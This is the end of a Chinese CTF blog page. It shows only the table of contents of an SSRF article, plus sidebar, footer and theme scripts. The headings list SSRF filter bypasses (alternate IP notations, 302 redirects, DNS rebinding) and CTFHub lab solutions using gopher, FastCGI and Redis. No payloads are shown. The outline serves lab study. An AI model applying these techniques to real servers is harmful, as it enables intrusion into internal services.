href="#%E5%88%A9%E7%94%A8%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.1.</span> <span class="toc-text">利用进制转换进行绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AB%E8%BF%9B%E5%88%B6"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">八进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">十六进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E8%BF%9B%E5%88%B6-%E8%BF%9E%E7%BB%AD"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">十进制(连续)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">1.4.2.</span> <span class="toc-text">302重定向</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.3.</span> <span class="toc-text">DNS重绑定绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">DNS 重绑定攻击的原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.4.4.</span> <span class="toc-text">利用@进行绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E9%9D%B6%E5%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">SSRF靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFHub"><span class="toc-number">2.1.</span> <span class="toc-text">CTFHub</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE"><span class="toc-number">2.1.1.</span> <span class="toc-text">内网访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">伪协议读取文件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%A7%A3%E9%A2%98"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">file伪协议解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">Web目录</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.3.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">2.1.4.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE127-0-0-1-flag-php"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">尝试访问127.0.0.1&#x2F;flag.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E6%9F%A5%E7%9C%8Bindex-php%E5%92%8Cflag-php"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">分别查看index.php和flag.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8gopher%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%BC%A0%E5%8F%82"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">利用gopher伪协议传参</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%80%83"><span class="toc-number">2.1.4.4.</span> <span class="toc-text">思考</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">2.1.5.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE127-0-0-1-flag-php-1"><span class="toc-number">2.1.5.1.</span> <span class="toc-text">尝试访问127.0.0.1&#x2F;flag.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8Bflag-php"><span class="toc-number">2.1.5.2.</span> <span class="toc-text">查看flag.php</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E6%8F%90%E4%BA%A4%E6%8C%89%E9%92%AE"><span class="toc-number">2.1.5.3.</span> <span class="toc-text">编写一个提交按钮</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8A%93POST%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8C%85"><span class="toc-number">2.1.5.4.</span> <span class="toc-text">抓POST的文件上传包</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8gopher%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%8A%E4%BC%A0POST%E5%8C%85"><span class="toc-number">2.1.5.5.</span> <span class="toc-text">用gopher伪协议上传POST包</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FastCGI%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.6.</span> <span class="toc-text">FastCGI协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Fastcgi%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.1.6.1.</span> <span class="toc-text">Fastcgi协议分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">2.1.6.2.</span> <span class="toc-text">解题思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.7.</span> <span class="toc-text">Redis协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Redis%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90"><span class="toc-number">2.1.7.1.</span> <span class="toc-text">Redis协议分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="toc-number">2.1.7.2.</span> <span class="toc-text">解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.7.2.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-1"><span class="toc-number">2.1.7.2.2.</span> <span class="toc-text">法二</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%9D%E8%80%83-1"><span class="toc-number">2.1.7.2.3.</span> <span class="toc-text">思考</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E8%8B%A5%E6%94%B9%E7%94%A8GET%E4%BC%A0%E5%8F%82"><span class="toc-number">2.1.7.2.3.1.</span> <span class="toc-text">1.若改用GET传参</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E4%B8%8D%E8%BE%93%E5%85%A5Shell%E5%86%85%E5%AE%B9"><span class="toc-number">2.1.7.2.3.2.</span> <span class="toc-text">2.不输入Shell内容</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">2.1.7.2.3.3.</span> <span class="toc-text">小结</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URLBypass"><span class="toc-number">2.1.8.</span> <span class="toc-text">URLBypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-1"><span class="toc-number">2.1.8.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">2.1.8.2.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97IP-Bypass"><span class="toc-number">2.1.9.</span> <span class="toc-text">数字IP Bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="toc-number">2.1.9.1.</span> <span class="toc-text">法一 进制转换</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E8%BF%9B%E5%88%B6-%E8%BF%9E%E7%BB%AD-1"><span class="toc-number">2.1.9.2.</span> <span class="toc-text">十进制(连续)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%AB%E8%BF%9B%E5%88%B6-1"><span class="toc-number">2.1.9.3.</span> <span class="toc-text">八进制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6-1"><span class="toc-number">2.1.9.4.</span> <span class="toc-text">十六进制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC"><span class="toc-number">2.1.10.</span> <span class="toc-text">302跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">2.1.11.</span> <span class="toc-text">DNS重绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%85%E8%B0%88DNS%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">2.1.11.1.</span> <span class="toc-text">浅谈DNS重绑定</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ps"><span class="toc-number">2.1.11.2.</span> <span class="toc-text">ps</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS-%E9%87%8D%E7%BB%91%E5%AE%9A"><span class="toc-number">2.1.11.3.</span> <span class="toc-text">DNS 重绑定</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/07/08/%E6%A0%A1%E8%B5%9B%E9%A2%98%E8%A7%A3/" title="校赛题解">校赛题解</a><time datetime="2024-07-08T06:54:33.000Z" title="发表于 2024-07-08 14:54:33">2024-07-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/16/SSRF/" title="SSRF">SSRF</a><time datetime="2024-05-16T07:29:34.000Z" title="发表于 2024-05-16 15:29:34">2024-05-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/20/Python-Flask%E6%A1%86%E6%9E%B6/" title="Python-Flask框架">Python-Flask框架</a><time datetime="2024-04-20T07:25:38.000Z" title="发表于 2024-04-20 15:25:38">2024-04-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/12/Python%E5%85%A5%E9%97%A8/" title="Python入门">Python入门</a><time datetime="2024-04-12T06:36:34.000Z" title="发表于 2024-04-12 14:36:34">2024-04-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/02/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">文件上传</a><time datetime="2024-04-02T06:37:49.000Z" title="发表于 2024-04-02 14:37:49">2024-04-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="MooSe" target="_blank">MooSe</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">13</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 留言板</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 随便逛逛</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 0.88rem;">Linux<sup>1</sup></a><a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 0.88rem;">前端<sup>2</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 0.88rem;">数据库<sup>1</sup></a></div></div><hr/></div></div><div id="keyboard-tips"><div class="keyboardTitle">博客快捷键</div><div class="keybordList"><div class="keybordItem"><div class="keyGroup"><div class="key">shift K</div></div><div class="keyContent"><div class="content">关闭快捷键功能</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift A</div></div><div class="keyContent"><div class="content">打开/关闭中控台</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift M</div></div><div class="keyContent"><div class="content">播放/暂停音乐</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift D</div></div><div class="keyContent"><div class="content">深色/浅色显示模式</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift S</div></div><div class="keyContent"><div class="content">站内搜索</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift R</div></div><div class="keyContent"><div class="content">随机访问</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift H</div></div><div class="keyContent"><div class="content">返回首页</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift F</div></div><div class="keyContent"><div class="content">友链鱼塘</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift L</div></div><div class="keyContent"><div class="content">友链页面</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift P</div></div><div class="keyContent"><div class="content">关于本站</div></div></div><div class="keybordItem"><div class="keyGroup"><div class="key">shift I</div></div><div class="keyContent"><div class="content">原版/本站右键菜单</div></div></div></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 MooSe 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="500" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="MISC,WEB,PWN,REVERSE,CRYPTO,PPC,STRGA" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>